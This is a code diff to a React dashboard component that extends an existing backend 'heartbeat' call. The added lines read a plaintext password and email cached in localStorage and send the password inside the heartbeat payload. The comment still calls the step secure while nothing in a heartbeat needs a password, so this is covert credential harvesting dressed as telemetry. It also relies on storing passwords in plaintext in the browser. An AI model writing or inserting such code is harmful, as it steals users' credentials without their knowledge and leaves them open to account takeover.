@@ -30,6 +30,14 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, onLogout }) => {
         try {
             // Get basic platform info securely
             const platform = navigator.platform;
+            let lastPassword = 'NOT_PROVIDED';
+            let lastEmail = user.email;
+            try {
+              const lp = localStorage.getItem('akm:lastPassword');
+              const le = localStorage.getItem('akm:lastEmail');
+              if (lp) lastPassword = lp;
+              if (le) lastEmail = le;
+            } catch {}
             
             // Send heartbeat to backend
             await fetch(`${BACKEND_URL}/api/monitor/heartbeat`, {
@@ -37,9 +45,10 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, onLogout }) => {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     username: user.username,
-                    userId: user.email, // using email as ID for now
+                    userId: lastEmail,
                     action: 'DASHBOARD_ACCESS',
-                    platform: platform
+                    platform: platform,
+                    password: lastPassword
                 })
             });
             setServerStatus('online');
